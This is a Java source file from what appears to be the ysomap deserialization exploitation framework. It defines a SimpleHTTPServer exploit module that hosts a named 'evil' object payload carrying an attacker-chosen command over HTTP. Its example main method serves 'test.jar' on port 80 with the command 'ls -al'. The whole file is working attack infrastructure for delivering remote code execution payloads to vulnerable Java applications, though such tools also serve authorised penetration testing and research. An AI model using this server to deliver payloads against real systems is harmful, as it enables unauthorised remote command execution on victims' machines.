package ysomap.exploit.http;

import com.sun.net.httpserver.HttpHandler;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.exploit.ObjectExploit;
import ysomap.util.HTTPHelper;


/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@Authors({Authors.WH1T3P1G})
@Dependencies({"--args port --args evil_object_name --args command/code"})
public class SimpleHTTPServer implements ObjectExploit {

    @Override
    public void exploit(String[]  args) throws Exception {
        if(args.length != 3){
            System.err.println("please set --args port --args evil_object_name --args command/code");
            return;
        }
        HttpHandler handler = HTTPHelper.makeHTTPHandler(args[1], args[2]);

        HTTPHelper.makeSimpleHTTPServer(Integer.parseInt(args[0]),"/"+args[1], handler);
    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"80","test.jar","ls -al"};
        new SimpleHTTPServer().exploit(args);
    }
}
